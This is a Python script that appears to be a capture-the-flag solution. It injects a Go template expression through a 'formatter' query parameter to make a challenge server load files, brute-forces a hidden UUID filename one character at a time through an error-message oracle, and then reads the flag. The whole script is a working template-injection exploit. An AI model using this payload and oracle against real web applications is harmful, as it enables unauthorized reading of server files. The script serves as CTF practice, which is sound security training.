import httpx
import urllib

BASE_URL = "http://request-bin-plus-e8beba2c.dailycookie.cloud"
# BASE_URL = "http://nlmlbpltcorlkzamsnmhbiynwigiqcmi.g2.ctf.so"


def is_ok(filename: str) -> bool:
    payload = "{{ .Ctx.Application.I18n.Load \"/flag%s.txt\" }}" % filename.split("-")[-1]
    url = f"{BASE_URL}/start?formatter=" + urllib.parse.quote(payload)

    res = httpx.get(
        url,
        follow_redirects=True,
    )
    return "line 1: cannot unmarshal" in res.text


N = 64
hyphen_positions = [8, 4, 4, 4, 12, 8, 4, 4, 4, 12]
for i in range(1, len(hyphen_positions)):
    hyphen_positions[i] += hyphen_positions[i - 1]
assert hyphen_positions[-1] == N

xs = [None] * N

CHARS = "0123456789abcdef"  # characters of uuid
for i in range(N):
    ys = []
    k = 0
    cur = None
    for j in range(N):
        if j == hyphen_positions[k]:
            ys.append("-")
            k += 1
        if j == i:
            cur = len(ys)
        if j < i:
            ys.append(xs[j])
        else:
            ys.append("?")

    hit_c = None
    for c in CHARS:
        ys[cur] = c
        filename = "".join(ys)

        if is_ok(filename):
            hit_c = c
            break

    assert hit_c is not None
    xs[i] = hit_c
    print(filename)


filename = ""
k = 0
for j in range(N):
    if j == hyphen_positions[k]:
        filename += "-"
        k += 1
    filename += xs[j]
filename = "".join(ys)
print(filename)  # Get the file name of `/$(uuidgen)-$(uuidgen)`


payload = '{{ .Ctx.Application.I18n.Load "/flag%s.txt" }}' % filename.split("-")[-1]

url = f"{BASE_URL}/start?formatter=" + urllib.parse.quote(payload)
res = httpx.get(
    url,
    follow_redirects=True,
)
print(res.text)  # Get the flag!
